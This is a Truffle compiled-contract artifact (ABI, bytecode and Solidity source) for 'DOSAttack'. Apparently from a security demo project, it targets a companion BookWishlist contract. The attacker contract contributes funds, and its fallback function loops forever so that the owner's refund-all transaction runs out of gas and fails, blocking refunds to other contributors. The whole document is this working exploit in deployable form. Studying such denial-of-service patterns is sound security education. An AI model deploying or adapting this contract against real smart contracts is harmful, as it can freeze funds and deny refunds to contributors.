{
  "contractName": "DOSAttack",
  "abi": [
    {
      "constant": false,
      "inputs": [],
      "name": "setUpAttack",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_t",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    }
  ],
  "bytecode": "0x6060604052341561000f57600080fd5b6040516020806101b483398101604052808051906020019091905050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101398061007b6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063559eb6d71461005c575b6000600290505b600115610059578081019050610048565b50005b610064610066565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c1cbbca73460006040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808281526020019150506000604051808303818588803b15156100f657600080fd5b6125ee5a03f1151561010757600080fd5b505050505600a165627a7a723058204d7c64ff71d56e198af0c255fea3cef97dc3e5c95ef0f97d7a9955aa9fc144930029",
  "source": "pragma solidity ^0.4.18;\n\nimport \"./BookWishlist.sol\";\n\n/*\n * This contract is constructed to take advantage of a DOW\n * flaw built into BookWishlist. It stops the target owner\n * from refunding other contributors.\n */\ncontract DOSAttack {\n    BookWishlist target;\n\n    function DOSAttack(address _t) public {\n        target = BookWishlist(_t);\n    }\n\n    // Sets up attack by contributing to target Wishlist.\n    function setUpAttack() public payable {\n        target.contribute.value(msg.value)(0);\n    }\n\n    /*\n     * If the wishlist owner tries to refund all, this will consume\n     * all gas, causing the transaction to fail.\n     */\n    function () public payable {\n        uint i = 2;\n        while(true) {\n            i += i;\n        }\n    }\n}\n",
  "sourcePath": "/Users/Chase/security/ExampleDapp/contracts/DOSAttack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
  },
  "schemaVersion": "1.0.1",
  "updatedAt": "2017-12-14T00:58:23.976Z"
}